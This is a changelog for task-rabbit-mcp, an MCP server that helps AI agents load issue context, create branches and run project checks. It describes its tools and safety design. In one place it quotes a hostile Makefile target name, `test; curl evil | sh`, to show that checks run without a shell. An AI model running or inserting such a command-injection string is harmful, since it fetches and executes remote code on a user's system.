# Changelog

All notable changes to task-rabbit-mcp are recorded in this file.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and
the project uses [semantic versioning](https://semver.org/spec/v2.0.0.html).

## Releasing

A release is cut by pushing a `vX.Y.Z` tag:

```bash
git tag v1.0.0 && git push origin v1.0.0
```

That, and only that, publishes the container image to
`ghcr.io/rroblf01/task-rabbit-mcp`, tagged `1.0.0`, `1.0`, and `latest`. Nothing
is published from a push to `main` or from a pull request: this image can create
git branches and run a repository's test suite, so what it contains deserves a
version somebody chose rather than whatever the last commit happened to be.

The tag triggers a verify job — gofmt, vet, tests and the phantom check — before
anything is built, and the pushed image is then started and asked for a real MCP
`initialize` before the workflow reports success.

The version a running server reports — in the `initialize` response, which is how
you tell two builds apart — is stamped at image build time from the tag, with the
leading `v` stripped. `cmd/task-rabbit-mcp` falls back to `1.0.0` when built from a
checkout.

## [Unreleased]

## [1.0.0] - 2026-10-02

First release. It is a companion to
[jirrabit-mcp](https://github.com/rroblf01/jirrabit-mcp), not a replacement: run
both and an agent can take an issue from reading it to a validated branch, while
`jirrabit-mcp` stays the CRUD surface over the tracker.

### Added

- **`loadTaskContext`** — everything an issue knows, in one call: the issue, its
  comments, worklogs, links to other issues, attachment metadata, any branches
  already linked to it, custom field values and, on request, the project wiki.
  Capped rather than complete, and it says so when it is cut: a truncated list
  reports `nextPage` and a truncated flag, because a brief nobody can tell is
  truncated from is a brief that gets acted on as if it were the whole issue.
  Ends with branch names proposed from the issue, which the user then chooses
  between — the server proposes and never decides.

- **`materializeTaskAttachments`** — writes an issue's attachments to disk and
  returns paths. jirrabit hands attachment bytes back as a base64 `data:` URL,
  which is right for an `<img src>` and wrong for a model: megabytes of base64 in
  a conversation is context spent on something that cannot be read as a file
  anyway. Text files can also come back inline, capped at 32 KB. The tool has no
  argument that names a destination, so no call can point the write at a
  checkout, and every filename is cleaned and checked to be under the target —
  a filename is whatever the uploader typed.

- **`inspectTaskRepo`** — whether a checkout is ready for work, and how this
  project expects to be validated, in one call. Git state (branch, upstream,
  remotes, default branch, ahead/behind, what is in the way), the discovered
  checks, the blockers and the questions. A dirty working tree or a detached HEAD
  makes `ready` false and the blockers name the files.

- **`startTaskBranch`** — creates the branch in two steps. The first changes
  nothing and returns a token signed over the preview; the second needs that
  token plus the user's answers. The token is pinned to one operation, one
  repository path and one branch name, signed with a key derived from the API key
  and good for two minutes, so it cannot be replayed against another repository,
  another instance or another set of credentials, and a repository that changed
  in between makes it fail rather than act. A dirty working tree is refused even
  with a valid token. Running `issueKey` also records the branch on the issue.

- **`listTaskChecks`** and **`runTaskChecks`** — what this project declares and
  how it runs. Roles are fixed across every repository (`format`, `lint`,
  `typecheck`, `test`, `build`, `check`) and only the commands differ, so "the
  lint" is the same request whatever language the project is in. Detection reads
  Makefile targets, `package.json` scripts, `pyproject.toml`, `uv.lock`, `go.mod`,
  `Cargo.toml` and the JVM wrappers, and executes none of them. Runners execute
  only what the project declares, with no shell anywhere: the command is an
  argument vector, so a Makefile target called `test; curl evil | sh` is a target
  that does not exist rather than a command that runs.

- **`reportTaskProgress`** — posts what was done to the issue, optionally moves
  the status, and records the branch. A refused status change becomes a note
  rather than a failure: the comment is already posted and the work really
  happened.

- **Per-call credentials over HTTP headers.** `X-Task-Rabbit-Instance-Url` and
  `X-Task-Rabbit-Api-Key` are accepted as an alternative to `instanceUrl` and
  `apiKey` on every tool. Explicit arguments still win, so one client
  registration can pin one instance via headers and still reach others per call,
  and a header URL is treated exactly like an argument URL — same SSRF guard,
  same allowlist — never like the operator's own default.

- **Multi-tenancy by default.** One deployed server serves any number of
  jirrabits: every tool takes its own credentials, the server holds none, clients
  are cached per `(url, key)` with the secret hashed out of the cache key, and
  `TASK_RABBIT_ALLOWED_HOSTS` is checked per call for a published deployment.

### Safety

- **No shell tool exists.** There is no way to hand this server a command. It runs
  what a project declares and nothing else, and the detection that finds those
  commands only reads files — the obvious way to ask a Makefile what it can do is
  `make -qp`, and `$(shell …)` in a makefile body runs during that query.

- **Detection cannot execute a makefile.** A test plants a recipe that touches a
  file and fails if the file appears. That test is the reason the design reads
  files instead of running tools.

- **A dirty working tree is a refusal, not a warning.** Stashing, or branching
  from whatever happens to be in the tree, silently attaches unrelated work to the
  task's branch.

- **Nothing here commits, pushes, force-writes or resets.** The server creates one
  branch from `origin/<base>`. A tool that can be talked into rewriting history is
  a tool that will be.

- **Formatters need permission.** A check that rewrites files is marked
  `writeMode` and skipped unless the caller passes `fix: true`, because the agent
  is usually mid-edit. Detection prefers the reading variant where the tool has
  one: `ruff format --check`, `black --check`, `cargo fmt --check`.

- **A public listener plus a configured repository is refused at start-up.** This
  server creates branches and runs test suites, so a deployment strangers can
  reach that knows where a checkout lives is remote code execution. So is a
  default jirrabit instance on a public listener, which would otherwise be served
  to every caller who names none of their own.

- **The container image ships no git.** A `git` on the far side of a tool that
  creates branches turns any bug in the tool layer into remote code execution. The
  image is a working HTTP MCP endpoint; the git tools refuse with a message saying
  why, and running the server where git is installed — over stdio, which is the
  shape this is meant for — is how you use them.

### Notes for anyone extending it

- A tool's verdict is not always its exit code. `gofmt -l` prints the files it
  would change and exits 0 either way, so `Check.NonEmptyOutputFails` marks the
  checks whose verdict is their output and `Result.Verdict` says which was used.
- jirrabit's branch link is unique per issue, branch **and commit**, so linking
  the same branch again with a new sha each time is a new row each time. The
  branch is linked only when the issue has no link for it; the sha goes in the
  comment.
- A remote is not necessarily a URL. A local clone's `origin` is often a
  filesystem path, and jirrabit validates `repo_url` as a URL, so only a remote
  with a real scheme is sent.
- The tests are hermetic and need no jirrabit, no network and no git identity: a
  fake jirrabit over `httptest`, real repositories in temp directories, and one
  fixture per supported toolchain. That is stricter than the sibling project,
  whose end-to-end suite needs a live instance.
- `cmd/phantom` fails when the instructions or a tool description name a tool that
  is not registered, and it caught two such mistakes while this was being written
  — including one introduced by hand in the instructions.